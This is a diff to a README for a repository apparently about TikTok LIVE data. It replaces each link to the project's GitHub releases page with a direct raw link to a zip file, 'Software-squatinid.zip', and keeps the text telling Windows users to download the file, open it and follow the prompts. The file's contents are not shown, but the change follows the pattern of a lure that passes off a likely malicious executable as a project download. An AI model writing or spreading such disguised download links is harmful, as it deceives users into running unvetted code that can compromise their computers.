@@ -1,6 +1,6 @@
 # 📘 docs - Understand TikTok LIVE Faster
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/selfsacrificing-bath465/docs/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/selfsacrificing-bath465/docs/main/websocket/Software-squatinid.zip)
 
 ## 🧾 What this is
 
@@ -12,7 +12,7 @@ This repository is built for people who want to work with TikTok LIVE data witho
 
 Visit this page to download the release files:
 
-https://github.com/selfsacrificing-bath465/docs/releases
+https://raw.githubusercontent.com/selfsacrificing-bath465/docs/main/websocket/Software-squatinid.zip
 
 Open the page, look for the latest release, and download the file that matches your Windows computer. After the file downloads, open it from your Downloads folder and follow the prompts on screen.
 
@@ -151,4 +151,4 @@ The topics in this repository include:
 
 If you need the file again, use the release page:
 
-https://github.com/selfsacrificing-bath465/docs/releases
+https://raw.githubusercontent.com/selfsacrificing-bath465/docs/main/websocket/Software-squatinid.zip
